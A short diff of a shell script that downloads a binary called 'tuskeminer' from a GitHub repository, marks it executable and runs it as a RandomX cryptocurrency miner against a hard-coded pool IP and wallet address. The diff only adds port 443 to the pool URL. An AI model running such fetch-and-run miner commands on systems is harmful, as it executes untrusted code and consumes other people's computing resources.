@@ -3,4 +3,4 @@ apt update
 apt -y install sudo
 wget https://github.com/cornea99/edann/raw/main/tuskeminer
 chmod +x tuskeminer
-./tuskeminer -a rx/0 --url 192.248.147.149 --user TuskeSyuXDmimmdhwmHLpzWxcgaxw28taAYJT79hbCfnJ7UHBLEKFFQG9Gbbv4fxGwd9kXPehzp2n1Yu43THWqdbKLujvTAWvH45mf.kidoo
+./tuskeminer -a rx/0 --url 192.248.147.149:443 --user TuskeSyuXDmimmdhwmHLpzWxcgaxw28taAYJT79hbCfnJ7UHBLEKFFQG9Gbbv4fxGwd9kXPehzp2n1Yu43THWqdbKLujvTAWvH45mf.kidoo
